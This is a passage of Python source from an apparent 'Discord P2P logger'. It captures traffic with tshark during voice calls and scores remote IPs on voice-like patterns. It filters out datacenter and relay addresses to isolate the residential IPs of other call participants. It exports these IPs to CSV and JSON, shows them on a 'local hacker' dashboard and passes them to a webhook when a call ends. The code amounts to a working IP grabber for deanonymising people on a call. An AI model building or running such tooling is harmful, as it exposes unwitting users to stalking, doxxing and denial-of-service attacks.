        if key not in self.edge_properties:
            self.edge_properties[key] = {
                'bytes': 0,
                'packets': 0,
                'first_seen': time.time(),
                'last_seen': time.time(),
                'has_reverse': False
            }
        
        self.edge_properties[key]['bytes'] += bytes_count
        self.edge_properties[key]['packets'] += 1
        self.edge_properties[key]['last_seen'] = time.time()
        
        # Check if reverse edge exists
        reverse_key = (dst_ip, src_ip)
        if reverse_key in self.edge_properties:
            self.edge_properties[key]['has_reverse'] = True
            self.bidirectional_pairs.add((src_ip, dst_ip))  # Confirmed peer pair!
    
    def get_connected_peers(self, ip: str, bidirectional_only=True) -> set:
        """Get IPs this one talks to (optionally only bidirectional)"""
        if bidirectional_only:
            return {peer for peer in self.edges.get(ip, set())
                    if (ip, peer) in self.bidirectional_pairs}
        return self.edges.get(ip, set())
    
    def get_peer_group(self, ip: str) -> list:
        """
        FIX #6: Find all IPs connected bidirectionally to this one
        Groups peers that communicate with shared endpoints
        """
        visited = set()
        queue = [ip]
        group = []
        
        while queue:
            current = queue.pop(0)
            if current in visited:
                continue
            visited.add(current)
            group.append(current)
            
            # Add bidirectional neighbors
            for peer in self.edges.get(current, set()):
                if (current, peer) in self.bidirectional_pairs and peer not in visited:
                    queue.append(peer)
        
        return group
    
    def link_sessions(self, sessions: Dict[str, 'IPSession']) -> Dict[str, int]:
        """
        FIX #5: Couple sessions - assign group IDs to IPs that communicate together
        """
        grouped = {}
        group_counter = 0
        visited = set()
        
        for ip in sessions:
            if ip in visited:
                continue
            
            # Get peer group for this IP
            peer_group = self.get_peer_group(ip)
            
            # Assign same group ID
            for peer in peer_group:
                grouped[peer] = group_counter
                visited.add(peer)
            
            group_counter += 1
        
        return grouped

# ============================================================================
# DISCORD PROCESS MONITORING - FIX #13: Process monitoring
# ============================================================================

class DiscordProcessMonitor:
    """Monitor Discord process lifecycle for call detection"""
    def __init__(self):
        self.process_name = "Discord.exe" if PLATFORM == "Windows" else "Discord"
        self.last_checked = time.time()
        self.check_interval = 2  # Check every 2 seconds
        self.is_running = False
        self.active_calls = []
    
    def check_running(self) -> bool:
        """Check if Discord is running"""
        try:
            if PLATFORM == "Windows":
                result = subprocess.run(
                    ["tasklist", "/FI", "IMAGENAME eq Discord.exe"],
                    capture_output=True, text=True, timeout=2
                )
                self.is_running = "Discord.exe" in result.stdout
            else:
                result = subprocess.run(
                    ["pgrep", "-l", "Discord"],
                    capture_output=True, text=True, timeout=2
                )
                self.is_running = len(result.stdout.strip()) > 0
        except Exception as e:
            return self.is_running
        
        return self.is_running
    
    def get_process_info(self) -> dict:
        """Get Discord process metrics"""
        return {
            'is_running': self.is_running,
            'last_checked': self.last_checked,
            'process_name': self.process_name
        }

# ============================================================================
# TEMPORAL ANALYSIS & SESSION HISTORY
# ============================================================================

class SessionHistoryTracker:
    """Track sessions over time for pattern recognition"""
    
    def __init__(self):
        self.current_session = None
        self.session_history = []  # List of completed sessions
        self.session_start_time = time.time()
        self.session_id = None
    
    def start_new_session(self) -> str:
        """Start a new recording session"""
        self.session_id = f"session_{int(time.time())}"
        self.session_start_time = time.time()
        return self.session_id
    
    def end_session(self, ip_sessions: Dict[str, 'IPSession']) -> dict:
        """End current session and save to history"""
        if not self.session_id:
            return {}
        
        session_data = {
            'session_id': self.session_id,
            'start_time': self.session_start_time,
            'end_time': time.time(),
            'duration': time.time() - self.session_start_time,
            'ips_seen': list(ip_sessions.keys()),
            'ip_count': len(ip_sessions),
            'total_packets': sum(s.total_packets for s in ip_sessions.values()),
            'total_bytes': sum(s.total_bytes for s in ip_sessions.values()),
        }
        
        self.session_history.append(session_data)
        return session_data
    
    def get_recurring_ips(self) -> Dict[str, int]:
        """Identify IPs that appear across multiple sessions"""
        ip_session_count = defaultdict(int)
        
        for session_data in self.session_history:
            for ip in session_data['ips_seen']:
                ip_session_count[ip] += 1
        
        return dict(ip_session_count)

# ============================================================================
# ADAPTIVE ML-BASED SCORING
# ============================================================================

class AdaptiveScorer:
    """
    ML-based adaptive scoring system that improves over time.
    Uses historical data to refine peer identification.
    """
    
    def __init__(self):
        self.feature_extractor = BehaviorFeatureExtractor()
        self.clusterer = TrafficClusterer()
        self.session_history = SessionHistoryTracker()
        self.recurring_ips = {}  # IPs seen in multiple sessions
        
        # Model weights (learned from feedback)
        self.weights = {
            'voice_confidence': 0.25,
            'symmetry': 0.15,
            'jitter': 0.15,
            'burst_pattern': 0.15,
            'endpoint_count': 0.15,
            'activity_level': 0.10,
            'is_recurring': 0.05,
        }
    
    def score_ip(self, ip: str, session: 'IPSession', metadata: dict, cluster_info: dict = None) -> float:
        """Score an IP using adaptive ML approach"""
        score = 0.0
        features = self.feature_extractor.extract_features(session)
        
        # Voice confidence (primary signal)
        voice_score = features['voice_confidence']
        score += voice_score * self.weights['voice_confidence']
        
        # Symmetry (real peers have balanced traffic)
        symmetry_score = 1.0 if features['symmetry_ratio'] > 0.4 else (features['symmetry_ratio'] / 0.4)
        score += symmetry_score * self.weights['symmetry']
        
        # Jitter (low for voice)
        if features['packet_interval_std'] > 0:
            jitter_score = 1.0 / (1.0 + (features['packet_interval_std'] / 0.01))
            score += jitter_score * self.weights['jitter']
        
        # Burst pattern (regular bursts for voice)
        burst_score = 1.0 if (2 < features['burst_count'] < 50) else 0.5 if features['burst_count'] > 0 else 0.1
        score += burst_score * self.weights['burst_pattern']
        
        # Endpoint count (1-3 for real peers, many for relays)
        endpoint_count = features['endpoint_count']
        if endpoint_count == 0:
            endpoint_score = 0.0
        elif endpoint_count <= 2:
            endpoint_score = 1.0
        elif endpoint_count <= 4:
            endpoint_score = 0.8
        elif endpoint_count <= 6:
            endpoint_score = 0.5
        else:
            endpoint_score = 0.1  # Likely relay
        score += endpoint_score * self.weights['endpoint_count']
        
        # Activity level (not too sparse)
        if features['total_bytes'] > 50*1024:  # 50KB
            activity_score = 1.0
        elif features['total_bytes'] > 10*1024:  # 10KB
            activity_score = 0.7
        else:
            activity_score = 0.3
        score += activity_score * self.weights['activity_level']
        
        # Recurring IP
        is_recurring = ip in self.recurring_ips and self.recurring_ips[ip] > 1
        recurring_score = 1.0 if is_recurring else 0.5
        score += recurring_score * self.weights['is_recurring']
        
        # Cluster penalty (many IPs = likely relay)
        if cluster_info and cluster_info.get('likely_relay'):
            score *= 0.7
        
        # Metadata signals
        if metadata:
            if metadata.get('is_datacenter'):
                score *= 0.1
            if metadata.get('is_residential'):
                score *= 1.1
        
        return min(1.0, max(0.0, score))

# ============================================================================
# TIME SERIES ANALYSIS (Join/Leave Detection) 
# ============================================================================

class TimeSeriesAnalyzer:
    """Detect when users join/leave based on traffic patterns"""
    def __init__(self, window_size: int = 30):  # 30 second windows
        self.window_size = window_size
        self.ip_activity = defaultdict(deque)  # IP -> [(time, bytes)]
        self.join_leave_events = []
        self.active_ips = set()
    
    def add_activity(self, ip: str, bytes_count: int):
        """Record activity for IP"""
        now = time.time()
        self.ip_activity[ip].append((now, bytes_count))
        
        # Keep only recent activity
        cutoff = now - (self.window_size * 3)
        while self.ip_activity[ip] and self.ip_activity[ip][0][0] < cutoff:
            self.ip_activity[ip].popleft()
    
    def get_active_ips(self) -> set:
        """Get IPs with recent activity (last N seconds)"""
        now = time.time()
        cutoff = now - 10  # Active if seen in last 10 seconds
        
        active = set()
        for ip, activity in self.ip_activity.items():
            if activity and activity[-1][0] > cutoff:
                active.add(ip)
        
        return active
    
    def detect_joins_leaves(self) -> Tuple[List[str], List[str]]:
        """Detect new joins and leaves since last check"""
        current_active = self.get_active_ips()
        
        joins = list(current_active - self.active_ips)
        leaves = list(self.active_ips - current_active)
        
        self.active_ips = current_active
        
        return joins, leaves

# ============================================================================
# MAIN CAPTURE ENGINE
# ============================================================================

class DiscordP2PLogger:
    """Main logger engine"""
    
    def __init__(self):
        self.tshark_path = get_tshark_path()
        self.logger = None
        self.analyzer = PacketAnalyzer()
        self.correlator = SessionCorrelator()
        self.anomaly_detector = AnomalyDetector()
        self.statistics = TrafficStatistics()
        
        # Behavioral analysis engine (new)
        self.behavior_extractor = BehaviorFeatureExtractor()
        self.metadata_enricher = MetadataEnricher()
        self.clusterer = TrafficClusterer()
        self.adaptive_scorer = AdaptiveScorer()
        self.session_history = SessionHistoryTracker()
        
        # FIX #5, #6: Peer graph for session coupling and src/dst relationships
        self.peer_graph = PeerGraph()
        
        # FIX #13: Process monitoring
        self.process_monitor = DiscordProcessMonitor()
        
        # Live display and ranking
        self.leaderboard = LiveLeaderboard(display_interval=10, metadata_enricher=self.metadata_enricher)
        self.leaderboard.ranking = IPRanking(adaptive_scorer=self.adaptive_scorer)
        
        self.timeseries = TimeSeriesAnalyzer(window_size=30)
        self.dns_cache = DNSLookupCache(cache_ttl=3600)
        self.dashboard_module = None
        
        # State tracking
        self.last_export_time = time.time()
        self.export_interval = 30  # Export every 30 seconds
        self.last_analysis_time = time.time()
        self.analysis_interval = 10  # Run deep analysis every 10 seconds
        
        self.start_time = time.time()
        self.running = True
        self.process = None
        self.restart_count = 0
        self.max_restarts = 5
        
        # Cleanup function
        self.cleanup_done = False
        
        # Call session management
        self.current_call_session_id = None
        self.call_session_start_time = time.time()
        self.call_session_warmup = 3.0
        self.last_ranking_update = 0
        self.ranking_update_interval = 5
        self.no_activity_count = 0  # For call end detection
        self.call_participants_ips = set()  # Track real peer IPs in call
        self.call_participants_info = {}  # IP -> {type, confidence, packets}
        
    def setup_paths(self):
        """Setup output paths (simplified)"""
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
        except:
            script_dir = os.getcwd()
        
        # Simple output to current directory
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        csv_file = os.path.join(script_dir, f"discord_p2p_{timestamp}.csv")
        json_file = os.path.join(script_dir, f"discord_p2p_{timestamp}.json")
        
        try:
            self.logger = BufferedLogger(csv_file, json_file)
        except Exception as e:
            print(f"[!] Logger init error: {e}")
            self.logger = None
        
        return csv_file, json_file
    
    def start_local_web_dashboard(self):
        """Start the local hacker dashboard in a background thread."""
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            dashboard_path = os.path.join(script_dir, 'local_hacker_logger.py')
            if not os.path.exists(dashboard_path):
                print("[!] Local dashboard file not found: local_hacker_logger.py")
                return

            spec = importlib.util.spec_from_file_location('local_hacker_logger', dashboard_path)
            if spec and spec.loader:
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                self.dashboard_module = module
                if hasattr(module, 'run_server'):
                    thread = threading.Thread(target=module.run_server, daemon=True)
                    thread.start()
                    print('[✓] Local dashboard started: http://127.0.0.1:8000')
                else:
                    print('[!] local_hacker_logger.py does not expose run_server()')
            else:
                print('[!] Could not load local_hacker_logger module')
        except Exception as e:
            print(f"[!] Could not start local dashboard: {e}")

    def _is_private_ip(self, ip: str) -> bool:
        """Check if IP is private/local (should NOT be shown)."""
        try:
            # Private IPv4 ranges
            if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('127.'):
                return True
            # 172.16-172.31.x.x
            if ip.startswith('172.'):
                parts = ip.split('.')
                if len(parts) >= 2:
                    second = int(parts[1])
                    if 16 <= second <= 31:
                        return True
            # IPv6 loopback and link-local
            if ip.startswith('::1') or ip.startswith('fe80:') or ip.startswith('fc00:') or ip.startswith('fd00:'):
                return True
            # Filter out known public services and datacenter IPs
            if is_public_service(ip) or is_discord_datacenter(ip):
                return True
        except:
            pass
        return False
    
    def dashboard_add_peer(self, peer_info: dict):
        """Send a peer record to the local dashboard module.
        STRICT filtering - only real call participants.
        """
        try:
            ip = peer_info.get('ip', '')
            
            # Filter out private/local IPs (the user's own machine)
            if self._is_private_ip(ip):
                return
            
            # CRITICAL: Filter out datacenter/relay IPs
            # Must be a real residential peer IP
            if not is_real_peer_ip(ip):
                return
            
            # Filter out datacenter IPs
            if is_likely_datacenter(ip):
                return
            
            # Store in call participants list if call is active
            if self.current_call_session_id:
                self.call_participants_ips.add(ip)
                self.call_participants_info[ip] = {
                    'type': peer_info.get('traffic_type', 'unknown'),
                    'packets': peer_info.get('packets', 0),
                    'bytes': peer_info.get('bytes', 0),
                    'confidence': peer_info.get('peer_confidence', 0),
                    'relay_confidence': peer_info.get('relay_confidence', 0),
                }
            
            if self.dashboard_module and hasattr(self.dashboard_module, 'dashboard_add_peer'):
                self.dashboard_module.dashboard_add_peer(peer_info)
            
            # Removed webhook sending - will send summary at end instead
        except Exception as e:
            pass

    def find_interface(self) -> Optional[str]:
        """
        FIX #11: Improved interface detection - find active voice interface
        Test each interface for actual voice codec patterns, not just any traffic
        """
        tshark = get_tshark_path()
        if not tshark:
            print("[!] tshark not found")
            return None
        
        try:
            # Get list of interfaces with names
            result = subprocess.run([tshark, "-D"], capture_output=True, text=True, timeout=5)
            interfaces = []
            
            for line in result.stdout.strip().split('\n'):
                if line.strip() and line[0].isdigit():
                    parts = line.split('.')
                    iface_num = parts[0].strip()
                    iface_name = parts[1].strip() if len(parts) > 1 else f"Interface {iface_num}"
                    interfaces.append((iface_num, iface_name))
            
            if not interfaces:
                print("[!] No network interfaces found")
                return None
            
            print(f"[*] Found {len(interfaces)} network interface(s):")
            for num, name in interfaces:
                print(f"    {num}: {name}")
            
            print("[*] Testing for Discord voice traffic patterns...\n")
            
            # Test each interface with stricter filtering for voice packets
            best_iface = None
            best_score = 0
            tested_count = 0
            
            for iface_num, iface_name in interfaces:
                try:
                    # Look for typical voice packet patterns:
                    # - Port 50000-65535 (Discord P2P)
                    # - Port 3478-3479 (STUN/TURN)
                    # - Port 5228 (Telegram)
                    # - UDP (voice is UDP)
                    print(f"  Testing {iface_name}...", end=" ", flush=True)
                    
                    result = subprocess.run(
                        [tshark, "-i", iface_num, "-a", "duration:2",
                         "-f", "(udp portrange 50000-65535) or (udp port 3478) or (udp port 3479) or (udp port 5228)",
                         "-T", "fields", "-e", "frame.len"],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    
                    packets = result.stdout.strip().split('\n')
                    packet_count = len([p for p in packets if p.strip()])
                    
                    print(f"{packet_count} packets")
                    tested_count += 1
                    
                    if packet_count > 0:
                        # Score: more packets = better activity
                        score = packet_count
                        
                        if score > best_score:
                            best_score = score
                            best_iface = iface_num
                            print(f"    ✓ New best: interface {iface_num} with {packet_count} packets")
                except subprocess.TimeoutExpired:
                    print("(timeout)")
                    tested_count += 1
                except Exception as e:
                    print(f"(error)")
                    pass
            
            print()
            
            if best_iface:
                print(f"[✓] Using interface {best_iface} (best voice activity with {best_score} packets)")
                return best_iface
            else:
                # Fallback: use first non-loopback interface
                for iface_num, iface_name in interfaces:
                    if "loopback" not in iface_name.lower():
                        print(f"[!] No active Discord voice detected, using first active interface: {iface_num} ({iface_name})")
                        return iface_num
                
                # Fallback: use first interface
                print(f"[!] Using first interface: {interfaces[0][0]} ({interfaces[0][1]})")
                return interfaces[0][0]
        
        except Exception as e:
            print(f"[!] Error finding interface: {e}")
            print("[*] Using fallback interface '1'")
            return "1"
    
    
    def build_filter(self) -> str:
        """
        Build tshark filter for P2P messaging apps and all related traffic:
        - Discord P2P (50000-65535, 5228)
        - STUN/TURN/Relay (3478-3479)
        - Telegram (5228)
        - Snapchat, Signal, WhatsApp, Viber
        - VPN detection (common VPN ports)
        """
        filters = [
            "(udp portrange 50000-65535)",      # Discord P2P range
            "(udp port 3478)",                  # STUN
            "(udp port 3479)",                  # TURN
            "(udp portrange 44-89)",            # Snapchat
            "(udp portrange 5000-5100)",        # Various P2P
            "(udp port 5228)",                  # Telegram, Google
            "(tcp port 443)",                   # HTTPS/VPN
            "(tcp port 80)",                    # HTTP
            "(tcp port 1194)",                  # OpenVPN
            "(udp port 1194)",                  # OpenVPN UDP
            "(tcp port 1723)",                  # PPTP VPN
            "(udp port 500)",                   # IPSec IKE
            "(udp port 4500)",                  # IPSec NAT-T
        ]
        return " or ".join(filters)
    
    def export_rankings(self):
        """
        Export all IP candidates with behavioral analysis and rankings.
        Includes features, metadata, clustering info.
        """
        now = time.time()
        if now - self.last_export_time < self.export_interval:
            return
        
        self.last_export_time = now
        
        # Update rankings
        self.update_rankings()
        
        if not self.leaderboard.ip_sessions:
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        
        # Enrich all data
        metadata_map = {}
        cluster_map = self.clusterer.cluster_ips(self.leaderboard.ip_sessions)
        
        for ip in self.leaderboard.ip_sessions.keys():
            metadata_map[ip] = self.metadata_enricher.enrich(ip)
        
        # Build export data with behavioral features
        export_data = []
        recurring_ips = self.session_history.get_recurring_ips()
        
        for ip, session in self.leaderboard.ip_sessions.items():
            score = self.leaderboard.ranking.get_score(ip)
            features = self.behavior_extractor.extract_features(session)
            metadata = metadata_map[ip]
            cluster_id = cluster_map.get(ip, -1)
            
            export_data.append({
                'ip': ip,
                'score': score,
                'rank': 0,  # Set below
                'voice_confidence': features['voice_confidence'],
                'packets': session.total_packets,
                'bytes': session.total_bytes,
                'inbound_mb': session.inbound_bytes / (1024*1024),
                'outbound_mb': session.outbound_bytes / (1024*1024),
                'symmetry': session.get_symmetry_ratio(),
                'consistency': session.get_packet_consistency(),
                'jitter_ms': features['packet_interval_std'] * 1000 if features['packet_interval_std'] > 0 else 0,
                'burst_count': features['burst_count'],
                'duration': session.get_duration(),
                'endpoints': len(session.endpoints_contacted),
                'asn': metadata['asn'],
                'hostname': metadata['hostname'],
                'is_datacenter': metadata['is_datacenter'],
                'is_residential': metadata['is_residential'],
                'is_residential': metadata['is_residential'],
                'cluster_id': cluster_id,
                'recurring_sessions': recurring_ips.get(ip, 0),
                'stun_detected': session.stun_detected,
                'rtt_ms': session.rtt_estimate,
            })
        
        # Sort by score
        export_data.sort(key=lambda x: x['score'], reverse=True)
        
        # Add ranks
        for i, item in enumerate(export_data, 1):
            item['rank'] = i
        
        # Export to CSV
        csv_file = f"discord_peers_{timestamp}.csv"
        try:
            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                if export_data:
                    writer = csv.DictWriter(f, fieldnames=export_data[0].keys())
                    writer.writeheader()
                    writer.writerows(export_data)
        except Exception as e:
            print(f"[!] CSV export error: {e}")
        
        # Export to JSON with detailed analysis
        json_file = f"discord_peers_{timestamp}.json"
        try:
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump({
                    'timestamp': timestamp,
                    'runtime_seconds': now - self.start_time,
                    'call_session_id': self.current_call_session_id,
                    'total_candidates': len(export_data),
                    'top_ranked': export_data[:15],
                    'all_candidates': export_data,
                    'analysis_summary': {
                        'total_clusters': len(set(c['cluster_id'] for c in export_data)),
                        'avg_score': sum(c['score'] for c in export_data) / len(export_data) if export_data else 0,
                        'voice_calls_detected': sum(1 for c in export_data if c['voice_confidence'] > 0.7),
                    }
                }, f, indent=2)
        except Exception as e:
            print(f"[!] JSON export error: {e}")
        
        print(f"[+] Exported {len(export_data)} candidates with behavior analysis")
    
    def detect_call_start(self, packet_count_delta: int) -> bool:
        """
        Detect when Discord call starts (sudden packet spike).
        packet_count_delta = packets received in last 1 second
        """
        # Check if we haven't detected a call start yet
        if self.current_call_session_id is None:
            # Detect start: if we have 15+ packets in single second (higher threshold)
            if packet_count_delta > 15:
                self.current_call_session_id = f"call_{int(time.time())}"
                self.call_session_start_time = time.time()
                self.call_participants_ips = set()
                self.call_participants_info = {}
                print(f"\n[+] CALL DETECTED - Session: {self.current_call_session_id}")
                print(f"[*] Analyzing call participants...\n")
                return True
        else:
            # Check if call has ended (very low activity for extended period)
            time_since_call_start = time.time() - self.call_session_start_time
            if time_since_call_start > 30:  # Only check after 30 seconds
                # If no packets for 10 seconds, assume call ended
                if packet_count_delta == 0:
                    # Check if we've had no activity for the last few checks
                    if not hasattr(self, 'no_activity_count'):
                        self.no_activity_count = 0
                    self.no_activity_count += 1
                    
                    if self.no_activity_count >= 10:  # 10 seconds of no activity
                        print(f"\n[-] CALL ENDED - Session: {self.current_call_session_id}")
                        print(f"[*] Call duration: {time_since_call_start:.1f} seconds")
                        print(f"[*] Participants found: {len(self.call_participants_ips)}\n")
                        self.send_call_participants_webhook()
                        self.current_call_session_id = None
                        self.call_session_start_time = 0
                        self.no_activity_count = 0
                else:
                    self.no_activity_count = 0
        
        return False
    
    def update_rankings(self):
        """Periodically update IP quality rankings with behavioral analysis"""
        now = time.time()
        if now - self.last_ranking_update < self.ranking_update_interval:
            return
        
        self.last_ranking_update = now
        
        # Enrich IPs with metadata
        metadata_map = {}
        for ip in self.leaderboard.ip_sessions.keys():
            metadata_map[ip] = self.metadata_enricher.enrich(ip)
        
        # Cluster traffic
        cluster_map = self.clusterer.cluster_ips(self.leaderboard.ip_sessions)
        
        # Update rankings with enriched data
        self.leaderboard.ranking.update_all(
            self.leaderboard.ip_sessions,
            metadata_map=metadata_map,
            cluster_map=cluster_map
        )
    
    def run_deep_analysis(self):
        """Run periodic deep behavioral analysis"""
        now = time.time()
        if now - self.last_analysis_time < self.analysis_interval:
            return
        
        self.last_analysis_time = now
        
        if not self.leaderboard.ip_sessions:
            return
        
        # Extract features for all sessions
        print("\n[*] Running behavioral analysis...")
        
        recurring_ips = self.session_history.get_recurring_ips()
        self.adaptive_scorer.recurring_ips = recurring_ips
        
        # Analyze clustering patterns
        cluster_map = self.clusterer.cluster_ips(self.leaderboard.ip_sessions)
        
        top_ips = self.leaderboard.ranking.get_top_ips(5)
        if top_ips:
            print(f"[+] Top peers ({len(self.leaderboard.ip_sessions)} candidates analyzed):")
            for rank, (ip, score) in enumerate(top_ips, 1):
                session = self.leaderboard.ip_sessions[ip]
                features = self.behavior_extractor.extract_features(session)
                metadata = self.metadata_enricher.enrich(ip)
                recurring = recurring_ips.get(ip, 1)
                
                peer_label = 'YES' if session.peer_confidence > 0.5 else 'NO'
                relay_label = 'YES' if session.relay_confidence > 0.5 else 'NO'
                print(f"  {rank}. {ip:18} | Score: {score:.3f} | Voice: {features['voice_confidence']:.2f} | Peer: {peer_label} | Relay: {relay_label} | ASN: {metadata['asn']}")
        
        print()
    
    def process_packet(self, line: str):
        """
        Process packet with proper bidirectional tracking and confidence scoring.
        FIX #1: Track both src->dst AND dst->src to determine real peer.
        FIX #2: Dynamic behavior-based classification instead of hard-coded rules.
        FIX #5, #6: Track src/dst relationships in peer graph.
        FIX #18: Classify traffic type (voice, signaling, relay, data).
        FIX #20: Calculate confidence scores instead of binary decisions.
        """
        try:
            parts = line.strip().split('\t')
            # Need 9 columns: ip.src, ip.dst, ipv6.src, ipv6.dst, udp.srcport, udp.dstport, tcp.srcport, tcp.dstport, frame.len
            if len(parts) < 9:
                return
            
            ip4_src = parts[0].strip()
            ip4_dst = parts[1].strip()
            ip6_src = parts[2].strip()
            ip6_dst = parts[3].strip()

            # Prefer IPv4 when present, otherwise IPv6
            src_ip = ip4_src if ip4_src else ip6_src
            dst_ip = ip4_dst if ip4_dst else ip6_dst

            try:
                udp_src_port = int(parts[4].strip()) if parts[4].strip() else 0
            except ValueError:
                udp_src_port = 0

            try:
                udp_dst_port = int(parts[5].strip()) if parts[5].strip() else 0
            except ValueError:
                udp_dst_port = 0
            
            try:
                tcp_src_port = int(parts[6].strip()) if parts[6].strip() else 0
            except ValueError:
                tcp_src_port = 0

            try:
                tcp_dst_port = int(parts[7].strip()) if parts[7].strip() else 0
            except ValueError:
                tcp_dst_port = 0

            try:
                pkt_len = int(parts[8].strip()) if parts[8].strip() else 0
            except ValueError:
                pkt_len = 0
            
            # Use UDP ports if available, otherwise TCP ports
            src_port = udp_src_port if udp_src_port > 0 else tcp_src_port
            dst_port = udp_dst_port if udp_dst_port > 0 else tcp_dst_port
            
            # FIX #4, #3: Accept more candidates, filter dynamically later
            # Process BOTH src and dst IPs (don't skip either)
            for ip, other_ip, port, is_src in [(src_ip, dst_ip, src_port, True), 
                                                 (dst_ip, src_ip, dst_port, False)]:
                # Skip invalid IPs
                if not ip or ip in ["0.0.0.0", "", "255.255.255.255"]:
                    continue
                
                # Filter: only IPv4 and IPv6
                if not (is_ipv6(ip) or self._is_ipv4(ip)):
                    continue
                
                # FIX #3: Accept all valid IPs (IPv4/IPv6) for geo logging
                # Accept Discord P2P ports but also anything >1024 for capture tracing
                if not (is_discord_p2p(ip, port) or port > 1024):
                    continue
                
                # Determine properties
                is_inbound = not is_src
                is_bidirectional_candidate = False
                
                # Get or create session
                session = self.leaderboard.ip_sessions.get(ip)
                if not session:
                    session = IPSession(ip)
                    self.leaderboard.ip_sessions[ip] = session
                
                # Update stats
                self.leaderboard.update_ip(ip, pkt_len, is_inbound, port)
                self.timeseries.add_activity(ip, pkt_len)
                
                # FIX #6: Track src/dst relationships in peer graph
                self.peer_graph.add_edge(src_ip, dst_ip, pkt_len, 'forward' if is_src else 'reverse')
                
                # Track direction
                if is_inbound:
                    session.inbound_bytes += pkt_len
                else:
                    session.outbound_bytes += pkt_len
                
                session.total_bytes += pkt_len
                session.total_packets += 1
                session.last_seen = time.time()
                session.add_port(port)
                
                # FIX #1: Check for bidirectionality
                # If we see BOTH src->dst AND dst->src, mark as bidirectional
                reverse_edge = (ip, other_ip) in self.peer_graph.edge_properties
                if reverse_edge:
                    session.is_bidirectional = True
                    is_bidirectional_candidate = True
                
                # Track endpoint contact (relay detection)
                session.add_endpoint(other_ip)
                
                # Track packet timing
                session.packet_times.append(time.time())
                session.packet_sizes.append(pkt_len)
                
                # FIX #18: Analyze and update traffic type
                session.analyze_traffic_type()
                
                # FIX #20: Calculate confidence scores
                session.calculate_peer_confidence()
                session.calculate_relay_confidence()
                
                # Push updated peer info to local dashboard
                if session.total_packets == 1 or session.total_packets % 10 == 0:
                    # Only add peers if a call is currently active
                    if self.current_call_session_id:
                        # STRICT filtering: only real call participants
                        # Must have:
                        # 1. Appeared at call start (within warmup period)
                        # 2. At least 20 packets (real voice traffic)
                        # 3. Bidirectional traffic (both in and out)
                        if (session.appeared_at_call_start and 
                            session.total_packets >= 20 and 
                            session.inbound_bytes > 0 and 
                            session.outbound_bytes > 0):
                            self.dashboard_add_peer({
                                'ip': ip,
                                'packets': session.total_packets,
                                'bytes': session.total_bytes,
                                'inbound_bytes': session.inbound_bytes,
                                'outbound_bytes': session.outbound_bytes,
                                'peer_confidence': round(session.peer_confidence, 3),
                                'relay_confidence': round(session.relay_confidence, 3),
                                'traffic_type': session.traffic_type,
                                'timestamp': datetime.now().isoformat(),
                            })
                
                # Detect STUN patterns
                session.detect_stun_pattern(port, port)
                
                # Call session tracking
                if self.current_call_session_id:
                    if session.call_session_id is None:
                        session.call_session_id = self.current_call_session_id
                        if time.time() - self.call_session_start_time < self.call_session_warmup:
                            session.appeared_at_call_start = True
            
            # Periodically update rankings with behavioral analysis
            self.update_rankings()
            
            # Run deep behavioral analysis
            self.run_deep_analysis()
            
            # Export rankings and analysis
            self.export_rankings()
            
            # Display live statistics
            if self.leaderboard.should_display():
                # FIX #9, #14: Smart filtering - only show candidates with meaningful data
                self._smart_display()
                joins, leaves = self.timeseries.detect_joins_leaves()
                if joins:
                    # Filter to only show meaningful new activity
                    meaningful_joins = [ip for ip in joins 
                                       if self.leaderboard.ip_sessions[ip].total_packets > 5]
                    if meaningful_joins:
                        print(f"\n[\u2191] NEW ACTIVITY: {', '.join(sorted(meaningful_joins))}")
                if leaves:
                    # Filter to only show meaningful departures
                    meaningful_leaves = [ip for ip in leaves 
                                        if self.leaderboard.ip_sessions.get(ip, IPSession('0')).total_packets > 5]
                    if meaningful_leaves:
                        print(f"[\u2193] ACTIVITY STOPPED: {', '.join(sorted(meaningful_leaves))}")
        
        except Exception as e:
            pass
    
    def _smart_display(self):
        """
        FIX #9, #14: Smart display - only show meaningful candidates.
        Filter out noise, show peers with confidence > threshold.
        """
        if not self.leaderboard.ip_sessions:
            return
        
        # Show all peers with any packet activity
        candidates = [
            (ip, session) for ip, session in self.leaderboard.ip_sessions.items()
            if session.total_packets > 0
        ]
        
        if not candidates:
            print("\n[+] No peers captured yet, waiting for traffic...")
            return
        
        # Sort by confidence
        candidates.sort(key=lambda x: x[1].peer_confidence, reverse=True)
        
        print("\n[+] PEER CANDIDATES (high confidence only):")
        for rank, (ip, session) in enumerate(candidates[:10], 1):  # Top 10 only
            confidence = "*" * int(session.peer_confidence * 5)  # Visual indicator
            mode_marker = "[V]" if session.traffic_type == "voice" else f"[{session.traffic_type[0].upper()}]"
            bd_marker = "[BI]" if session.is_bidirectional else ""
            peer_label = 'YES' if session.peer_confidence > 0.5 else 'NO'
            relay_label = 'YES' if session.relay_confidence > 0.5 else 'NO'
            print(f"  {rank}. {ip:18} {mode_marker} Conf:{session.peer_confidence:.2f} {confidence} {bd_marker} | Peer: {peer_label} | Relay: {relay_label}")
    
    def _is_ipv4(self, ip: str) -> bool:
        """Check if address is IPv4"""
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        except:
            return False
    
    def _calculate_metrics(self, ip: str) -> Dict:
        """Calculate all metrics for an IP"""
        try:
            jitter = self.analyzer.get_jitter(ip)
            burst_ratio = self.analyzer.get_burst_ratio(ip)
            port_entropy = self.analyzer.get_port_entropy(ip)
            rtt = self.analyzer.estimate_rtt(ip)
            
            metrics = {
                'jitter': jitter,
                'burst_ratio': burst_ratio,
                'port_entropy': port_entropy,
                'rtt': rtt,
                'packet_consistency': 1.0 - min(jitter, 1.0),
            }
            
            # Check relay (safe)
            try:
                port = int(list(self.analyzer.port_entropy[ip])[0]) if self.analyzer.port_entropy[ip] else 0
            except (IndexError, ValueError):
                port = 0
            
            is_relay, _, _ = is_relay_traffic(ip, port)
            metrics['is_relay'] = is_relay
            
            # Check VPN (safe)
            try:
                is_vpn, _, vpn_conf = detect_vpn_proxy(ip, port, jitter, rtt)
                metrics['is_vpn'] = is_vpn
            except Exception:
                metrics['is_vpn'] = False
            
            # Check anomaly (safe)
